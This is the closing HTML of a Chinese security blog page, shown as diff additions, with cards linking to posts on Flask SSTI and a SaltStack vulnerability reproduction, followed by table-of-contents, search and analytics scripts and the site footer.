+                        <img src="/medias/featureimages/13.jpg" class="responsive-img" alt="Flask SSTI 利用方式探索">
+                        
+                        <span class="card-title">Flask SSTI 利用方式探索</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            Flask SSTI 利用方式探索SSTI 简介 &amp; 环境搭建模板一个统一风格的站点，其大多数页面样式都是一致的，只是每个页面显示的内容各不相同。要是所有的逻辑都放在前端进行，无疑会影响响应效果和效率，很不现实。把所有的逻辑放在后端
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-06-22
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/SSTI/" class="post-category">
+                                    SSTI
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/SSTI/">
+                        <span class="chip bg-color">SSTI</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/05/13/saltstack-yuan-cheng-ming-ling-zhi-xing-lou-dong-fu-xian-cve-2020-11651/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="SaltStack 远程命令执行漏洞复现（CVE-2020-11651）">
+                        
+                        <span class="card-title">SaltStack 远程命令执行漏洞复现（CVE-2020-11651）</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            SaltStack 远程命令执行漏洞复现（CVE-2020-11651）SaltStack 简介SaltStack 是基于 Python 开发的一套 C/S 架构配置管理工具，是一个服务器基础架构集中化管理平台，具备配置管理、远程执行、监控
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-05-13
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="post-category">
+                                    漏洞复现
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">
+                        <span class="chip bg-color">漏洞复现</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+    
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+<style type="text/css">
+code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }
+</style>
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+    <footer class="page-footer bg-color">
+    <div class="container row center-align" style="margin-bottom: 0px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2019</span>
+            <a href="https://www.geekby.xyz" target="_blank">Geekby</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/Geekby" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:geekby@geek-by.xyz" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
